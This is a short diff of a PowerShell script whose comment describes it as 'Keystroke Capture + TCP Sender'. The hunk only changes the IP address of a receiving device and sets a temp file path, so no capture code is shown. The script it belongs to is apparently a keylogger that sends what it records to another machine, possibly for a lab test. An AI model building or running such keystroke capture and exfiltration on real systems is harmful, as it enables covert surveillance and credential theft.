@@ -1,5 +1,5 @@
 # Device B - Keystroke Capture + TCP Sender
-$deviceAIP = "172.17.2.85"
+$deviceAIP = "10.1.64.212"
 
 # Setup temp file
 $path = "$env:temp\testing.txt"
